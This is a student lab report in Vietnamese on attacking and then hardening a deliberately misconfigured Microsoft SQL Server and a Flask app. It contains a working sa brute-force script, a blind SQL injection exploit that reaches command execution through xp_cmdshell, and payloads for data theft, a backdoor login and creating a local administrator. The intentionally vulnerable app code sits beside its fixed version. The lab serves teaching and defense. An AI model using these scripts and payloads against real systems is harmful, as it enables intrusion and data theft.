# DBS401 — LAB CHƯƠNG 4
# CÀI ĐẶT, TẤN CÔNG VÀ THỰC THI LỆNH TỪ XA TRÊN MICROSOFT SQL SERVER

> **Ngày thực hiện:** 18/09/2026
> **Sinh viên:** Phạm D. — Lớp DBS401

---

## I. Môi trường thực hành

### Khác biệt so với PDF (giữ nguyên bản chất lab)

| Hạng mục | PDF yêu cầu | Thực tế |
|---|---|---|
| **SQL Server** | 2022 Developer, Default instance, port 1433 | 2025 Express, instance `SQLEXPRESS`, TCP **1434** (Docker) / **1433** (native) |
| **Driver Python** | `pyodbc` + ODBC Driver 18 | `pymssql` (kết nối TDS trực tiếp, không cần ODBC Driver) |
| **Attacker** | Kali Linux VM (host-only) | Chính máy Windows (pymssql, requests, sqlmap) |
| **Web app** | `app.py` dùng pyodbc | `app.py` dùng pymssql, logic SQLi giống hệt |

**Bản chất không đổi:** Mixed Mode + sa yếu + app ghép chuỗi + autocommit → cùng chuỗi tấn công Brute-force/SQLi → RCE.

### Cấu hình hệ thống

- **SQL Server 2025 Express** — instance `SQLEXPRESS`, TCP tĩnh **1433**, **Mixed Mode**, `sa/Password1` (cố tình yếu).
- **Database `shopdb`:**
  - `products(id, name, price)` — 3 sản phẩm (Bàn phím, Chuột, Màn hình)
  - `customers(id, fullname, cccd, balance)` — 2 khách hàng (chứa CCCD nhạy cảm)
- **Web Flask** `app.py`: kết nối bằng `sa`, `q = "..." + pid` (SQLi), `autocommit(True)`.
- **Attacker tools:** pymssql, requests, sqlmap.

### Dữ liệu khởi tạo (`init.sql`)

```sql
CREATE DATABASE shopdb;
USE shopdb;
CREATE TABLE products (id INT PRIMARY KEY, name NVARCHAR(100), price INT);
INSERT INTO products VALUES (1,N'Ban phim',500000),(2,N'Chuot',250000),(3,N'Man hinh',3000000);
CREATE TABLE customers (id INT PRIMARY KEY, fullname NVARCHAR(100), cccd VARCHAR(20), balance BIGINT);
INSERT INTO customers VALUES (1,N'Nguyen Van A','037201099888',50000000),
                             (2,N'Tran Thi B','038155777222',12000000);
```

---

## II. Phần 1 — Cài đặt SQL Server (cấu hình yếu có chủ ý)

### Ba quyết định an ninh lúc cài

| # | Cấu hình | Giá trị đặt (yếu có chủ ý) | Vì sao nguy hiểm |
|---|---|---|---|
| 1 | **Authentication Mode** | Mixed Mode | Bật SQL login → tồn tại tài khoản `sa` để brute-force |
| 2 | **Mật khẩu sa** | `Password1` | `sa` là sysadmin, tên cố định → chỉ phải đoán mật khẩu |
| 3 | **App kết nối bằng sa** | `UID=sa` trong `app.py` | SQLi kế thừa quyền sysadmin → bật được xp_cmdshell |

### Câu hỏi phân tích

**1. Vì sao Mixed Mode mở ra tài khoản sa cho kẻ tấn công, còn Windows Auth thì không?**

Mixed Mode bật thêm SQL Authentication bên cạnh Windows Authentication. Khi đó tài khoản `sa` (SQL login mặc định, vai trò sysadmin) được kích hoạt và có thể đăng nhập qua mạng bằng username/password. Kẻ tấn công biết chắc tên là `sa`, chỉ cần brute-force mật khẩu. Ngược lại, **Windows Authentication only** không có SQL login nào → không có `sa` để brute-force; xác thực dựa trên tài khoản Windows/Kerberos, khó tấn công từ xa hơn nhiều.

**2. Bật SQL Browser (UDP 1434) đánh đổi tiện lợi lấy điều gì về an ninh?**

SQL Browser trả về thông tin instance (tên instance, phiên bản, cổng TCP) cho bất kỳ ai hỏi UDP 1434 — **không cần xác thực**. Tiện cho client tự tìm instance, nhưng kẻ tấn công dùng `nmap -sU -p 1434` sẽ biết ngay có SQL Server, tên instance, version chính xác → thu hẹp phạm vi tấn công. Nên **tắt Browser** khi không cần và chỉ định port tĩnh cho client.

---

## III. Phần 2 — Web app dính SQL Injection

### Mã nguồn `app.py` (vulnerable)

```python
from flask import Flask, request, render_template
import pymssql

app = Flask(__name__)
DB_CONF = {"server": "localhost", "port": 1434, "user": "sa",
           "password": "Password1", "database": "shopdb"}

def get_conn():
    cn = pymssql.connect(**DB_CONF)
    cn.autocommit(True)   # stacked query có hiệu lực ngay
    return cn

@app.route("/product")
def product():
    pid = request.args.get("id", "1")
    cn = get_conn()
    cur = cn.cursor()
    q = "SELECT id,name,price FROM products WHERE id = " + pid  # LỖI SQLi: ghép chuỗi
    try:
        cur.execute(q)
        rows = cur.fetchall()
        cn.close()
        return "<br>".join(str(tuple(r)) for r in rows) or "no rows"
    except Exception as e:
        cn.close()
        return "SQL error: " + str(e)
```

**Hai lỗi chủ ý:**
1. **Ghép chuỗi** `"... WHERE id = " + pid` → SQL Injection.
2. **Kết nối bằng `sa`** (sysadmin) → SQLi kế thừa toàn quyền → RCE.

### Kiểm tra hoạt động

```
curl "http://localhost:5000/product?id=1"
→ (1, 'Ban phim', 500000)    ✓
```

### Câu hỏi phân tích

**1. Viết lại dòng `q = ...` cho đúng (tham số hoá):**

```python
# Trước (vulnerable):
q = "SELECT id,name,price FROM products WHERE id = " + pid
cur.execute(q)

# Sau (parameterized):
cur.execute("SELECT id,name,price FROM products WHERE id = %s", (pid,))
```

Dùng `%s` placeholder (pymssql) hoặc `?` (pyodbc), truyền `pid` qua tuple. Database engine phân biệt dữ liệu vs mã SQL → chặn mọi payload tiêm.

**2. Vì sao app kết nối bằng sa là yếu tố biến SQLi thành RCE?**

`sa` có vai trò **sysadmin** — quyền cao nhất trong SQL Server. Khi app dùng `sa`, mọi câu SQL qua lỗ SQLi đều chạy dưới quyền sysadmin. Kẻ tấn công có thể:
- `sp_configure 'xp_cmdshell',1` → bật xp_cmdshell
- `EXEC xp_cmdshell 'whoami'` → chạy lệnh OS

Nếu app dùng login thường (vd `db_datareader`), SQLi vẫn đọc được dữ liệu nhưng **không bật được** xp_cmdshell → không RCE.

---

## IV. Phần 3 — Trinh sát

### Quét cổng & banner

```bash
# TCP 1433 — SQL Server
nmap -p 1433 -sV --script ms-sql-info,ms-sql-ntlm-info <TARGET_IP>

# UDP 1434 — SQL Browser
nmap -sU -p 1434 --script ms-sql-info <TARGET_IP>
```

**Kết quả (trên môi trường thực tế):**
- Port 1433/tcp **open** → `Microsoft SQL Server 2025`
- Banner lộ version, instance name `SQLEXPRESS`
- SQL Browser trả thông tin instance + TCP port

### Câu hỏi phân tích

**1. Chỉ banner phiên bản (chưa đăng nhập) đã là một finding chưa?**

**Có.** Lộ phiên bản chính xác giúp kẻ tấn công tra CVE, chọn exploit phù hợp, loại bỏ payload không tương thích → giảm "tiếng ồn" và tăng tỷ lệ thành công. Recon (trinh sát) quan trọng ngang khai thác vì nó quyết định kẻ tấn công đi hướng nào.

**2. Nếu tắt SQL Browser thì nmap UDP 1434 trả về gì?**

Trả `filtered` hoặc `closed` — kẻ tấn công không biết tên instance, phải đoán port thủ công. Công sức tăng đáng kể: phải quét nhiều port hơn và thử nhiều cấu hình kết nối hơn.

---

## V. Phần 4 — Nhánh A: Brute-force sa → RCE

### Bước 1 — Brute-force mật khẩu sa

**File `pw.txt`:**
```
admin
sa
Password
Password1
P@ssw0rd
123456
```

**Script `brute_sa.py`** (thay `nxc mssql` khi không có NetExec):

```python
import pymssql
with open("pw.txt") as f:
    candidates = [x.strip() for x in f if x.strip()]
for pw in candidates:
    try:
        cn = pymssql.connect(server="localhost", user="sa", password=pw,
                             database="master", login_timeout=5)
        cur = cn.cursor()
        cur.execute("SELECT IS_SRVROLEMEMBER('sysadmin')")
        is_admin = cur.fetchone()[0]
        print(f"[+] sa:{pw} (sysadmin={is_admin}) (Pwn3d!)")
        break
    except Exception as e:
        print(f"[-] sa:{pw} -> {str(e)[:100]}")
```

**Kết quả:**
```
[-] sa:admin -> Login failed for user 'sa'
[-] sa:sa -> Login failed for user 'sa'
[-] sa:Password -> Login failed for user 'sa'
[+] sa:Password1 (sysadmin=1) (Pwn3d!)
```

✅ Tìm được `sa:Password1`, quyền **sysadmin**.

### Bước 2 — Bật xp_cmdshell và chạy lệnh OS

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

**Kết quả:**
```
nt service\mssql$sqlexpress
```

### Bước 3 — Mở rộng RCE

```sql
EXEC xp_cmdshell 'hostname';    →  admin
EXEC xp_cmdshell 'ipconfig';    →  hiện cấu hình mạng đầy đủ
```

✅ **RCE đạt** — chạy được lệnh hệ điều hành từ xa dưới quyền tài khoản dịch vụ.

### Câu hỏi phân tích

**1. Nếu sa dài 16 ký tự ngẫu nhiên, brute-force còn khả thi không?**

**Không.** Mật khẩu 16 ký tự ngẫu nhiên (chữ hoa + thường + số + ký tự đặc biệt) có không gian ~10^30 tổ hợp. Tốc độ brute-force qua mạng (TDS login) chậm (~vài trăm/giây), cộng với lock-out policy → brute-force trở nên bất khả thi.

**2. Vì sao enable_xp_cmdshell cần vai trò sysadmin?**

`sp_configure` là system stored procedure chỉ sysadmin mới gọi được. Login chỉ có `db_datareader` **không** bật được xp_cmdshell, không thay đổi cấu hình server → không RCE. Tuy nhiên, vẫn đọc được dữ liệu nếu còn SQLi.

---

## VI. Phần 5 — Nhánh B: SQL Injection → RCE

> **Bối cảnh:** Không biết mật khẩu sa, chỉ có web app cổng 5000.

### Bước 1 — Xác nhận SQLi

```bash
# Bình thường
curl "http://localhost:5000/product?id=1"
→ (1, 'Ban phim', 500000)

# Payload OR — dump tất cả
curl "http://localhost:5000/product?id=1%20or%201=1"
→ (1, 'Ban phim', 500000)<br>(2, 'Chuot', 250000)<br>(3, 'Man hinh', 3000000)
# Trả 3 dòng thay vì 1 → CÓ SQLi ✓

# UNION — lộ phiên bản
curl "http://localhost:5000/product?id=0%20UNION%20SELECT%201,@@version,3"
→ (1, 'Microsoft SQL Server 2025 ...', 3)
```

### Bước 2 — Tự động hoá bằng sqlmap

```bash
sqlmap -u "http://localhost:5000/product?id=1" --batch --dbms=mssql
# → Detect: Microsoft SQL Server, injectable parameter 'id'

sqlmap -u "http://localhost:5000/product?id=1" --batch --dbms=mssql --dbs
# → master, model, msdb, shopdb, tempdb

sqlmap -u "http://localhost:5000/product?id=1" --batch --dbms=mssql --os-shell
# → Thất bại tự động: app chỉ trả result-set đầu, payload re-enable của sqlmap
#   không hợp → đúng điểm PDF "RCE mù phải làm 3 bước"
```

### Bước 3 — Thủ công: RCE mù 3 bước (`exploit_sqli.py`)

**Vì sao phải 3 bước?**
App chỉ trả result set **đầu tiên** (câu SELECT). Khi tiêm stacked query, `xp_cmdshell` chạy nhưng output nằm ở result set thứ hai — app không hiện. Giải pháp: hứng output vào bảng rồi đọc lại bằng UNION.

```python
import requests
B = "http://localhost:5000/product"

def send(pid):
    r = requests.get(B, params={"id": pid}, timeout=15)
    print(r.text[:500])

# (1) Bật xp_cmdshell (mù — không thấy output)
send("1; EXEC sp_configure 'show advanced options',1;RECONFIGURE;"
     " EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE; --")

# (2) Chạy whoami, hứng output vào bảng dbo.o (mù)
send("1; IF OBJECT_ID('dbo.o') IS NOT NULL DROP TABLE dbo.o;"
     " CREATE TABLE dbo.o(line NVARCHAR(4000));"
     " INSERT dbo.o EXEC xp_cmdshell 'whoami'; --")

# (3) Đọc output qua UNION → hiện ở vị trí cột 'name'
send("0 UNION SELECT 1,(SELECT TOP 1 line FROM dbo.o WHERE line IS NOT NULL),3 --")
```

**Kết quả:**
```
(1, 'nt service\mssql$sqlexpress', 3)
```

✅ **RCE đạt** qua web (cổng 5000), không cần biết mật khẩu sa.

### Mở rộng tấn công

| Payload | Mục đích | Kết quả |
|---|---|---|
| `UNION SELECT id,fullname,cccd FROM customers` | Đọc trộm dữ liệu nhạy cảm | Lộ CCCD, balance |
| `xp_cmdshell 'type C:\Windows\...\hosts'` | Đọc file OS | Lộ nội dung file |
| `CREATE LOGIN backdoor ... sysadmin` | Persistence — cửa hậu | Tạo login sysadmin mới |

### Câu hỏi phân tích

**1. Quyền sysadmin ở Nhánh B đến từ đâu?**

Từ **chuỗi kết nối của app**. App dùng `UID=sa` (sysadmin) để kết nối SQL Server. Mọi câu SQL tiêm qua lỗ SQLi đều chạy dưới phiên sa → kế thừa quyền sysadmin. Kẻ tấn công không biết mật khẩu sa nhưng "mượn" quyền sa thông qua app.

**2. Nếu app dùng login `shop_ro` chỉ có SELECT, SQLi còn dẫn tới RCE không? Còn đọc trộm customers không?**

- **RCE:** Không. `shop_ro` (db_datareader) không có quyền gọi `sp_configure`, không bật được xp_cmdshell.
- **Đọc trộm:** **CÓ.** `db_datareader` được SELECT mọi bảng trong database → nếu còn SQLi, `UNION SELECT ... FROM customers` vẫn lộ dữ liệu (CCCD, balance). → **Phải tham số hoá** để chặn SQLi hoàn toàn.

---

## VII. Phần 6 — Tài khoản dịch vụ

### Kết quả `xp_cmdshell 'whoami'`

```
nt service\mssql$sqlexpress
```

### Bảng phân tích mức thiệt hại theo tài khoản dịch vụ

| whoami trả về | Nghĩa | Kẻ tấn công làm tiếp được |
|---|---|---|
| `nt service\mssqlserver` | Virtual account, quyền hạn chế (**đúng**) | Bị giới hạn; còn SeImpersonate → thử leo lên |
| `nt authority\system` | Chạy bằng LocalSystem (**lỏng**) | Toàn quyền máy: tạo admin, dump SAM, cài cửa hậu |
| `<domain>\sqlsvc` | Tài khoản domain có quyền | Đi ngang sang máy khác, tấn công cả domain |

**Trong lab:** `nt service\mssql$sqlexpress` = virtual account, quyền hạn chế → mức thiệt hại được kiềm chế (đúng cấu hình).

### Câu hỏi phân tích

**1. Nếu whoami trả về `nt authority\system`, 3 việc kẻ tấn công làm được ngay:**

1. **Tạo tài khoản Administrator** cục bộ: `net user hacker P@ss /add && net localgroup Administrators hacker /add`
2. **Dump SAM** (hash mật khẩu tất cả user local): dùng `reg save` hoặc `mimikatz` → crack offline
3. **Cài backdoor / reverse shell** chạy persistent (scheduled task, service) → truy cập lại bất kỳ lúc nào

**2. Đặc quyền tối thiểu cho tài khoản dịch vụ SQL Server:**

Dùng **Virtual Account** mặc định (`NT Service\MSSQLSERVER`) hoặc **Managed Service Account (gMSA)** trong domain. Không bao giờ chạy bằng `Administrator` hay `LocalSystem` vì:
- Nếu SQL Server bị xâm phạm → kẻ tấn công thừa hưởng quyền tài khoản dịch vụ
- `LocalSystem` = toàn quyền máy = mất kiểm soát hoàn toàn
- Nguyên tắc **least privilege**: chỉ cấp quyền vừa đủ để dịch vụ hoạt động

---

## VIII. Phần 7 — Phòng thủ, rồi tấn công lại

### 1. Tắt xp_cmdshell

```sql
EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;
EXEC sp_configure 'show advanced options', 0; RECONFIGURE;
```

### 2. Vô hiệu sa

```sql
ALTER LOGIN sa DISABLE;
-- SSMS: Server Properties > Security > Windows Authentication mode > restart
```

### 3. App dùng login quyền tối thiểu + tham số hoá

```sql
CREATE LOGIN shop_ro WITH PASSWORD = 'ShopRo_Manh_NgauNhien_2026!';
USE shopdb;
CREATE USER shop_ro FOR LOGIN shop_ro;
ALTER ROLE db_datareader ADD MEMBER shop_ro;
```

**`app_fixed.py`** — bản đã sửa:

```python
DB_CONF = {"server": "localhost", "port": 1433, "user": "shop_ro",
           "password": "ShopRo_Manh_NgauNhien_2026!", "database": "shopdb"}

@app.route("/product")
def product():
    pid = request.args.get("id", "1")
    cn = pymssql.connect(**DB_CONF)
    cur = cn.cursor()
    cur.execute("SELECT id,name,price FROM products WHERE id = %s", (pid,))  # tham số hoá
    rows = cur.fetchall()
    cn.close()
    return "<br>".join(str(tuple(r)) for r in rows) or "no rows"
```

**Thay đổi:**
- `sa` → `shop_ro` (db_datareader, không sysadmin)
- `"..." + pid` → `%s, (pid,)` (tham số hoá)

### 4. Thu hẹp mạng

```powershell
Set-Service SQLBrowser -StartupType Disabled; Stop-Service SQLBrowser
```

### 5. Dọn dẹp artifacts tấn công

```sql
DROP TABLE IF EXISTS dbo.o;          -- bảng hứng output RCE
DROP LOGIN backdoor;                  -- cửa hậu đã tạo
```

### Kiểm chứng — Tấn công lại phải THẤT BẠI

| Tấn công | Lệnh | Kết quả sau phòng thủ |
|---|---|---|
| **Brute-force sa** | `python brute_sa.py` | ❌ Error 18456 — Login failed (sa disabled) |
| **SQLi `or 1=1`** | `?id=1 or 1=1` | ❌ Conversion error — tham số hoá chặn |
| **SQLi UNION** | `?id=0 UNION SELECT 1,@@version,3` | ❌ Conversion error — không dump được |
| **sqlmap** | `sqlmap -u "...?id=1" --batch` | ❌ Không tìm thấy điểm tiêm |
| **xp_cmdshell** (nếu còn SQLi) | `sp_configure` qua shop_ro | ❌ Permission denied — không phải sysadmin |

✅ **Mọi chuỗi tấn công đều thất bại** sau khi phòng thủ.

---

## IX. Tổng hợp — Quyết định cài đặt ↔ Mặt tấn công ↔ Phòng thủ

| Quyết định lúc cài | Nếu sai → mặt tấn công | Phòng thủ |
|---|---|---|
| Chế độ xác thực | Mixed Mode → có sa để brute-force | Windows Authentication only |
| Mật khẩu sa | Yếu → lọt → sysadmin | Tắt sa / mật khẩu mạnh 16+ ký tự |
| Quyền kết nối của app | App dùng sa → SQLi → RCE | Login riêng, db_datareader, **tham số hoá** |
| xp_cmdshell | Bật được → RCE | Tắt; hạn chế sysadmin |
| Tài khoản dịch vụ | LocalSystem → chiếm máy/domain | Virtual account, quyền tối thiểu |
| Giao thức & cổng | 1433 mở rộng + Browser → dễ dò | Chỉ mở cho IP cần; tắt Browser |

### Ba nguyên tắc phòng thủ

1. **Đặc quyền tối thiểu** (Least Privilege) — tài khoản dịch vụ, login app, sysadmin
2. **Bề mặt tấn công tối thiểu** (Minimize Attack Surface) — cổng, giao thức, xp_cmdshell, Browser
3. **Quan sát** (Monitoring) — audit đăng nhập thất bại, đọc log, phát hiện bất thường

> **Kết luận:** Không có bước vá thần kỳ — chỉ là những lựa chọn đúng lẽ ra phải làm lúc cài. Cùng chuỗi tấn công, cấu hình đúng thì đứt ngay ở bước [1] (brute-force) hoặc [3] (bật xp_cmdshell).

---

## X. Proof of Lab

### Ảnh 1 — RCE

- `xp_cmdshell 'whoami'` (Nhánh A) → `nt service\mssql$sqlexpress`
- `exploit_sqli.py` (Nhánh B) → `(1, 'nt service\mssql$sqlexpress', 3)`

### Ảnh 2 — Phòng thủ

- Brute-force sa → Error 18456 (login failed)
- SQLi `or 1=1` / UNION → conversion error
- sqlmap → không tìm thấy điểm tiêm
- `shop_ro` không bật được xp_cmdshell

---

## Phụ lục — Danh sách file

| File | Mô tả |
|---|---|
| `app.py` | Web app **vulnerable** — kết nối sa, ghép chuỗi |
| `app_fixed.py` | Web app **sau phòng thủ** — shop_ro, tham số hoá |
| `brute_sa.py` | Nhánh A: brute-force sa qua pymssql |
| `exploit_sqli.py` | Nhánh B: RCE mù 3 bước qua SQLi |
| `persist.py` | Mở rộng: tạo login backdoor sysadmin qua SQLi |
| `init.sql` | Script khởi tạo shopdb |
| `pw.txt` | Wordlist mật khẩu cho brute-force |
| `docker-compose.yml` | SQL Server container (thay thế khi không cài native) |
